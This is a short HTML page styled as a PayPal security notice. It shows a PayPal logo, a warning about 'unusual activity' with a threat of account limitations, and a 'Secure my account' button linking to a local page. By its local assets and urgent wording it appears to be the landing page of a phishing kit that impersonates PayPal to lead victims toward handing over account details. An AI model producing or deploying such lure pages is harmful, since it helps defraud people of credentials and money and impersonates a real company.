<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>PayPal Notice</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root {
      --text-color: #111111;
      --muted-color: #555555;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
        Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      color: var(--text-color);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .page {
      width: 100%;
      max-width: 420px;
      padding: 32px 24px 40px;
      text-align: center;
    }

    .logo {
      margin-bottom: 32px;
    }

    .logo-img {
      width: 64px;
      height: 64px;
      display: block;
      margin: 0 auto;
      border-radius: 16px;
    }

    h1 {
      font-size: 28px;
      line-height: 1.2;
      margin-bottom: 16px;
    }

    p {
      font-size: 15px;
      line-height: 1.5;
      color: var(--muted-color);
      margin-bottom: 32px;
    }

    .primary-btn {
      display: inline-block;
      width: 100%;
      max-width: 340px;
      padding: 16px 24px;
      font-size: 16px;
      font-weight: 600;
      text-decoration: none;
      color: #ffffff;
      background-color: #034FB3;
      border-radius: 999px;
      border: none;
      outline: none;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
    }

    .primary-btn:hover {
      opacity: 0.95;
    }

    @media (min-width: 480px) {
      .page {
        padding-top: 56px;
        padding-bottom: 56px;
      }
    }
  </style>
</head>
<body>
  <main class="page">
    <div class="logo">
      <img src="paypal-logo.png" alt="PayPal" class="logo-img" />
    </div>

    <h1>We've noticed some unusual activity</h1>

    <p>
      We need your help securing your account to prevent any unauthorised
      access. For your safety, there may be some limitations on your account
      if the information isn't correct.
    </p>

    <a href="home.html" class="primary-btn">Secure my account</a>

  </main>
</body>
</html>
